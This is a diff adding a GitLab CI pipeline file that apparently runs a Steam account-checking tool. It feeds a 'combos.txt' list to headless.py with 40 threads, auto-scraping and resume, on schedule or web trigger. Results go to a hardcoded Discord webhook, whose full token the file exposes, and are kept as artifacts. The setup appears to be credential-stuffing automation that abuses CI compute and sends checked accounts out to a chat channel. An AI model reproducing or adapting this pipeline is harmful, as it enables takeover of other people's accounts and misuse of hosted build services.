@@ -1,0 +1,30 @@
+﻿stages:
+  - run_validator
+
+variables:
+  PYTHONUNBUFFERED: "1"
+  DEBIAN_FRONTEND: "noninteractive"
+  DISCORD_WEBHOOK_URL: "https://discord.com/api/webhooks/1548283725819674714/ScoIrZpwklucgiwb-oq4UrDvGLmqG62qeSXYjZe1q0Fb1QP-j1tFDbLUmFCfHrtjlpxb"
+
+run_104society_pipeline:
+  stage: run_validator
+  image: python:3.11-slim
+  timeout: 3h
+  before_script:
+    - apt-get update && apt-get install -y --no-install-recommends git curl ca-certificates
+    - python -m pip install --upgrade pip
+    - pip install -r requirements.txt || true
+  script:
+    - echo "=== 104SOCIETY STEAM VALIDATOR — GITLAB ULTIMATE CI ==="
+    - python -c "import requests; print('Relay ping:', requests.post('$DISCORD_WEBHOOK_URL', json={'content':'⚡ **GitLab Ultimate CI Pipeline Aktif!**'}, timeout=10).status_code)" || true
+    - python headless.py --combos combos.txt --threads 40 --webhook "$DISCORD_WEBHOOK_URL" --auto-scrape --resume
+  artifacts:
+    name: "104Society_Results_$CI_COMMIT_SHORT_SHA"
+    when: always
+    expire_in: 30 days
+    paths:
+      - results/
+  rules:
+    - if: '$CI_PIPELINE_SOURCE == "schedule"'
+    - if: '$CI_PIPELINE_SOURCE == "web"'
+    - if: '$CI_COMMIT_BRANCH == "main"'
